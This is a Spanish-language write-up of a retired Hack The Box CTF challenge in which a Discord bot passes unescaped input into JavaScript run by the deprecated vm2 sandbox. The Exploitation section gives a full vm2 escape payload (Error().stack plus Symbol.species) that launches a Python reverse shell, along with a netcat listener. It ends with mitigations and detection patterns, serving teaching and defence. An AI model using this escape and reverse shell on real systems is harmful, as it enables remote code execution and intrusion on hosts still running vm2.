---
challenge: Super-Duper Pwn
category: Misc
type: Misc
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [misc, javascript, vm2, discord, sandbox-escape]
---

# Super-Duper Pwn — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de método; sin flags reales.

## TL;DR

Bot de Discord con cuatro comandos; `/checkout` inserta el código de descuento en una plantilla de JavaScript y lo manda a una API que lo ejecuta dentro de **vm2**, un paquete ya deprecado. Con el rol `Loggedin` se llega al endpoint, se rompe el sandbox con el bypass de `Error().stack` + `Symbol.species` y se obtiene una reverse shell para ejecutar `/readflag`.

## Enunciado y superficie

- Categoría Misc, dificultad Easy; Business CTF 2024.
- Se entrega el código del bot y de la API, y un enlace de invitación del bot.
- El enunciado plantea una tienda autoservicio regentada por robots.

## Reconocimiento

Se invita el bot a un servidor propio y se listan los comandos:

- `/listproducts` y `/viewcart`: sin entrada relevante.
- `/addtocart <id> <cantidad>`: añade productos a un carrito por usuario.
- `/checkout <discount>`: requiere el rol `Loggedin` y calcula el total.

Crear el rol `Loggedin` en el servidor y asignárselo desbloquea `/checkout`.

## Análisis del código

```js
const discountCode = interaction.options.getString("discount");

const definitions = `
    const discountCodes = { "DISCOUNT10": 0.10, "DISCOUNT20": 0.20, "DISCOUNT30": 0.30 };
    let cart = ${JSON.stringify(cart)};
    let discountCode = '${discountCode}';
    let discount = 0;
`;
```

El descuento se interpola **dentro de una cadena** sin escapar, así que una comilla cierra el literal y permite añadir código. El resultado se envía a `evaluateCode`, que hace `POST http://api:3000/run` con `{ code }`.

La API ejecuta:

```js
const vm = new VM();
let output = vm.run(code);
```

`VM` es de `vm2`, retirado por sus escapes conocidos. No hay ninguna otra validación del código.

## Explicación del fallo

Dos capas débiles: la construcción de código por concatenación de plantillas y un sandbox que ya no recibe parches. La primera permite inyectar; la segunda, salir del contexto y alcanzar `process`. El bypass usa el hecho de que `Error().stack` crea un objeto fuera del sandbox y `Symbol.species` permite sustituir la promesa para ejecutar código en el constructor.

## Reproducción local

```bash
docker compose up --build
```

El `docker-compose.yml` levanta los contenedores `bot` y `api`; el bot necesita un token de Discord válido, así que en local se prueba la API directamente con `curl` al endpoint `/run`.

## Explotación

Payload (basado en el bypass público de vm2), envuelto para encajar en la plantilla:

```js
';const ip = "<IP>";
const port = 9001;
const revshell = `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/sh")'`;
async function fn() {
    (function stack() { new Error().stack; stack(); })();
}
p = fn();
p.constructor = {
    [Symbol.species]: class FakePromise {
        constructor(executor) {
            executor(
                (x) => x,
                (err) => { return err.constructor.constructor("return process")().mainModule.require("child_process").execSync(revshell); }
            )
        }
    }
};
p.then();let a = '
```

- El `';` inicial cierra el literal de `discountCode` y el `;let a = '` final deja la plantilla válida.
- Se envía en `/checkout <payload>`; el bot lo pasa a la API.
- En la máquina atacante: `nc -nvlp 9001`.
- Al recibir la conexión, ejecutar `/readflag`.

## Evidencia

- Rol `Loggedin` creado y `/checkout` aceptado.
- Petición a `/run` con el código inyectado.
- Reverse shell y salida de `/readflag`; flag en `private/`.

## Lecciones aprendidas

- **Plantillas con entrada**: interpolar en una cadena de código es inyección, aunque el destino sea un sandbox.
- **vm2 está retirado**: no es un límite de seguridad actual; hay que migrar a `isolated-vm` o a un proceso separado.
- **Envolver el payload**: sin el `';` inicial y el cierre final, la plantilla no compila y el fallo no se dispara.

## Mitigaciones y detección

- No construir código con concatenación: usar un intérprete de expresiones con lista blanca o evaluar solo datos.
- Sustituir vm2 por aislamiento real (proceso sin privilegios, contenedor, `isolated-vm`) y sin `child_process`.
- Detección: peticiones a `/run` con `Error().stack`, `Symbol.species`, `constructor.constructor` o `mainModule.require`; procesos `python3`/`sh` lanzados por la API.

## Referencias

- <https://github.com/hackthebox/business-ctf-2024/tree/main/misc/%5BEasy%5D%20Super-Duper%20Pwn>
- <https://gist.github.com/leesh3288/f693061e6523c97274ad5298eb2c74e9>
- <https://www.npmjs.com/package/vm2>
